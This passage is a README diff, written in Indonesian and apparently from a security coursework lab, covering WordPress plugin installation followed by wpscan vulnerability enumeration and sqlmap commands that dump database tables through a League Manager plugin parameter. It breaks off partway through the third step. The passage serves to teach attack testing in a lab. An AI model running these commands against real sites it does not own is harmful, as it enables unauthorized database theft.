@@ -118,3 +118,34 @@ sudo chown -R :www-data /var/www/html/wp-content/uploads
 ### Hasil halaman wordpress yang berhasil diinstall
 ![GitHub Logo](PKSJ2/sip.JPG)
 
+## Instalasi Plugin Wordpress
+1. Silahkan buka bagian **wp-admin** dan silahkan buka bagian menu plugin. Lalu silahkan tekan tombol bagian **Add New**
+![GitHub Logo](PKSJ2/plugin.JPG)
+
+2. Silahkan tekan tombol upload plugin untuk mengupload plugin yang kita download secara external, ataupun langusng di search pada kolom serch plugin. Setelah muncul tombolo browse, silahkan pilih plugin mana yang ingin di install, dan silahkan langsung di install
+![GitHub Logo](PKSJ2/plugin1.JPG)
+
+## Exploit Wordpress Menggunakan Tools SQLMAP dan WPSCAN
+### Exploit Wordpress menggunakan WPscan
+Fungsi penggunaan wpscan dalam exploit kali ini adalah untuk mendeteksi celah keamanan dari sebuah web berbasis wordpress. Penggunaan wpscan adalah jalankan kode dibawah dengan terminal.
+```
+wpscan --url http://[url yang dituju] -enumerate
+```
+Maka akan muncul tanda yang menunjukan celah keamanan dari plugin yang sudah di install pada wordpress
+![GitHub Logo](PKSJ2/wpscan.JPG)
+
+###Exploit dan Inject Sql menggunakan Sqlmap
+####Inject Melalui League Manager
+1. Silahkan jalankan perintah dibawah ini untuk mengetahui bagaimana struktur tabel dari wordpress yang ada
+```
+sqlmap --url "http://[alamat yang dituju]/?match=1" --tables
+```
+![GitHub Logo](PKSJ2/sqlmaplm1.JPG)
+
+2. Ketika kita ingin mengetahui bagaimana isi dari tabel yang kita inginkan, silahkan jalankan script dibawah ini
+```
+sqlmap --url "http://[alamat yang dituju]/?match=1" --dump -D [database yang diinginkan] -T [tabel yang diinginkan]
+```
+![GitHub Logo](PKSJ2/sqlmaplm2.JPG)
+
+3. Ketika sudah mendapatkan data nya 
